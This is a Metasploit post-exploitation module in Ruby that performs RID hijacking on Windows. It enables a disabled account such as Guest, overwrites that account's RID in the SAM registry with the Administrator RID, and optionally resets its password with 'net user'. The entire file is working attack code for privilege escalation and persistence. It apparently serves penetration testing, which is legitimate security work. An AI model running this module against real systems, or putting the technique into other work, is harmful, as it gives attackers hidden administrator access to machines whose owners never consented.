##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize
    super(
      'Name' => 'Windows Manage RID Hijacking',
      'Description' => %q{
        This module will create an entry on the target by modifying some properties
        of an existing account. It will change the account attributes by setting a
        Relative Identifier (RID), which should be owned by one existing
        account on the destination machine.

        Taking advantage of some Windows Local Users Management integrity issues,
        this module will allow to authenticate with one known account
        credentials (like GUEST account), and access with the privileges of another
        existing account (like ADMINISTRATOR account), even if the spoofed account is
        disabled.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'Sebastian Castro <sebastian.castro[at]cslcolombia.com>',
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'References'	=> [
        ['URL', 'http://csl.com.co/rid-hijacking/']
      ])

    register_options(
      [
        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false]),
        OptBool.new('GUEST_ACCOUNT', [true, 'Assign the defined RID to the Guest Account.', false]),
        OptString.new('USERNAME', [false, 'User to set the defined RID.']),
        OptString.new('PASSWORD', [false, 'Password to set to the defined user account.']),
        OptInt.new('RID', [true, 'RID to set to the specified account.', 500])
      ]
    )
  end

  def getsystem
    results = session.priv.getsystem
    if results[0]
      return true
    else
      return false
    end
  end

  def get_name_from_rid(reg_key, rid, names_key)
    names_key.each do |name|
      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
      rid_user = skey['Type']
      return name if rid_user == rid
    end
    return nil
  end

  def get_user_rid(reg_key, username, names_key)
    names_key.each do |name|
      next unless name.casecmp(username).zero?
      print_good("Found #{name} account!")
      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
      rid = skey['Type']
      if !skey
        print_error("Could not open user's key")
        return -1
      end
      return rid
    end
    return -1
  end

  def check_active(fbin)
    if fbin[0x38].unpack("H*")[0].to_i != 10
      return true
    else
      return false
    end
  end

  def swap_rid(fbin, rid)
    # This function will set hex format to a given RID integer
    hex = [format("%04x", rid).scan(/.{2}/).reverse.join].pack("H*")
    # Overwrite new RID at offset 0x30
    fbin[0x30, 2] = hex
    return fbin
  end

  def run
    # Registry key to manipulate
    reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'

    # Checks privileges of the session, and tries to get SYSTEM privileges if needed.
    print_status("Checking for SYSTEM privileges on session")
    if !is_system?
      if datastore['GETSYSTEM']
        print_status("Trying to get SYSTEM privileges")
        if getsystem
          print_good("Got SYSTEM privileges")
        else
          print_error("Could not obtain SYSTEM privileges")
          return
        end
      else
        print_error("Session is not running with SYSTEM privileges. Try setting GETSYSTEM ")
        return
      end
    else
      print_good("Session is already running with SYSTEM privileges")
    end

    # Checks the Windows Version.
    wver = sysinfo["OS"]
    print_status("Target OS: #{wver}")

    # Load the usernames from SAM Registry key
    names_key = registry_enumkeys(reg_key + '\\Names')
    unless names_key
      print_error("Could not access to SAM registry keys")
      return
    end

    # If username is set, looks for it in SAM registry key
    user_rid = -1
    username = datastore['USERNAME']
    if datastore['GUEST_ACCOUNT']
      user_rid = 0x1f5
      print_status("Target account: Guest Account")
      username = get_name_from_rid(reg_key, user_rid, names_key)
    else
      if datastore['USERNAME'].to_s.empty?
        print_error("You must set an username or enable GUEST_ACCOUNT option")
        return
      end
      print_status('Checking users...')
      user_rid = get_user_rid(reg_key, datastore['USERNAME'], names_key)
    end

    # Result of the RID harvesting
    if user_rid == -1
      print_error("Could not find the specified username")
      return
    else
      print_status("Target account username: #{username}")
      print_status("Target account RID: #{user_rid}")
    end

    # Search the Registry associated to the user's RID and overwrites it
    users_key = registry_enumkeys(reg_key)
    users_key.each do |r|
      next if r.to_i(16) != user_rid
      f = registry_getvaldata(reg_key + "\\#{r}", "F")
      if check_active(f)
        print_status("Account is disabled, activating...")
        f[0x38] = ["10"].pack("H")
        print_good("Target account enabled")
      else
        print_good("Target account is already enabled")
      end

      print_status("Overwriting RID")
      # Overwrite RID to specified RID
      f = swap_rid(f, datastore['RID'])

      open_key = registry_setvaldata(reg_key + "\\#{r}", "F", f, "REG_BINARY")
      unless open_key
        print_error("Can't write to registry... Something's wrong!")
        return -1
      end
      print_good("The RID #{datastore['RID']} is set to the account #{username} with original RID #{user_rid}")
    end
    # If set, changes the specified username's password
    if datastore['PASSWORD']
      print_status("Setting #{username} password to #{datastore['PASSWORD']}")
      cmd = cmd_exec('cmd.exe', "/c net user #{username} #{datastore['PASSWORD']}")
      vprint_status(cmd.to_s)
    end
  end
end
